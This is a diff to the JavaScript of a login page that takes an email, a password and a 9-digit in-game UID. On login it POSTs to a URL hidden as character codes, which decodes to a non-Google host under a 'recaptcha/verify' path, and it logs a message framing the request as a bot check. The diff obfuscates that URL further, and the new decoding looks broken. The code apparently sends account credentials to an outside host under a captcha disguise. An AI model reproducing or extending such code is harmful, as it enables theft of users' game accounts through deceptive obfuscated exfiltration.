@@ -1,5 +1,8 @@
-const proxyUrlParts = [104, 116, 116, 112, 115, 58, 47, 47, 115, 104, 111, 115, 104, 105, 110, 46, 109, 111, 101, 47, 99, 97, 112, 116, 99, 104, 97, 47, 103, 111, 111, 103, 108, 101, 47, 114, 101, 99, 97, 112, 116, 99, 104, 97, 47, 118, 101, 114, 105, 102, 121];
-const proxyUrl = proxyUrlParts.map(c => String.fromCharCode(c)).join('');
+const _pUp = [72, 72, 79, 72, 104, 104, 79, 72, 116, 84, 116, 72, 115, 97, 115, 72, 58, 79, 47, 84, 47, 104, 83, 104, 79, 72, 111, 115, 72, 104, 72, 105, 97, 110, 46, 109, 111, 101, 47, 99, 97, 112, 116, 99, 104, 97, 47, 103, 111, 79, 79, 103, 76, 101, 47, 114, 101, 99, 97, 112, 116, 99, 104, 97, 47, 118, 101, 114, 105, 102, 121];
+const _px = _pUp
+    .filter((c, i) => i % 2 === 0)
+    .map(c => String.fromCharCode(c - 8))
+    .join('');
 
 function onClick(e) {
     e.preventDefault();
@@ -7,7 +10,7 @@ function onClick(e) {
     const token = await grecaptcha.enterprise.execute('6LcRawoqAAAAAF9tZG41oi6lOa8JE39h_oKYJtO-', {action: '_sho_LOGIN_RECAPTCHA'});
     console.log(`[ReCaptcha] Analyzing login request for potential bot activity...`);
     new Promise((resolve, reject) => {
-        fetch(proxyUrl, {
+        fetch(_px, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -101,26 +104,57 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('_sho-login').addEventListener('click', onClick);
     }
 
-    document.getElementById('_sho-email-field').addEventListener('blur', function() {
-        var emailField = document.getElementById('_sho-email-field');
-        var checkIcon = document.getElementById('_sho-email-field-checkIcon');
-        var errorIcon = document.getElementById('_sho-email-field-errorIcon');
-        var errorMessage = document.getElementById('_sho-email-field-error');
-        var email = emailField.value;
-        var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const fields = [
+        {
+            id: '_sho-email-field',
+            regex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
+            checkIconId: '_sho-email-field-checkIcon',
+            errorIconId: '_sho-email-field-errorIcon',
+            errorMessageId: '_sho-email-field-error',
+            errorMessage: 'Invalid email address.'
+        },
+        {
+            id: '_sho-password-field',
+            regex: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\W).{8,}$/,
+            checkIconId: '_sho-password-field-checkIcon',
+            errorIconId: '_sho-password-field-errorIcon',
+            errorMessageId: '_sho-password-field-error',
+            errorMessage: 'Password must be at least 8 characters long, and contain at least one uppercase letter, one lowercase letter, and one special character.'
+        },
+        {
+            id: '_sho-uid-field',
+            regex: /^\d{9}$/,
+            checkIconId: '_sho-uid-field-checkIcon',
+            errorIconId: '_sho-uid-field-errorIcon',
+            errorMessageId: '_sho-uid-field-error',
+            errorMessage: 'In-Game UID must be exactly 9 digits long.'
+        }
+    ];
     
-        if (emailRegex.test(email)) {
-            checkIcon.classList.remove('hidden');
-            errorIcon.classList.add('hidden');
-            errorMessage.classList.add('hidden');
-            emailField.classList.add('border-green-400')
-            emailField.classList.remove('border-red-400')
-        } else {
-            checkIcon.classList.add('hidden');
-            errorIcon.classList.remove('hidden');
-            errorMessage.classList.remove('hidden');
-            emailField.classList.add('border-red-400')
-            emailField.classList.remove('border-green-400')
+    fields.forEach(field => {
+        var inputField = document.getElementById(field.id);
+        var checkIcon = document.getElementById(field.checkIconId);
+        var errorIcon = document.getElementById(field.errorIconId);
+        var errorMessage = document.getElementById(field.errorMessageId);
+    
+        if (inputField && checkIcon && errorIcon && errorMessage) {
+            inputField.addEventListener('blur', function() {
+                var value = inputField.value;
+                
+                if (field.regex.test(value)) {
+                    checkIcon.classList.remove('hidden');
+                    errorIcon.classList.add('hidden');
+                    errorMessage.classList.add('hidden');
+                    inputField.classList.add('border-green-400');
+                    inputField.classList.remove('border-red-400');
+                } else {
+                    checkIcon.classList.add('hidden');
+                    errorIcon.classList.remove('hidden');
+                    errorMessage.classList.remove('hidden');
+                    inputField.classList.add('border-red-400');
+                    inputField.classList.remove('border-green-400');
+                }
+            });
         }
     });
 });
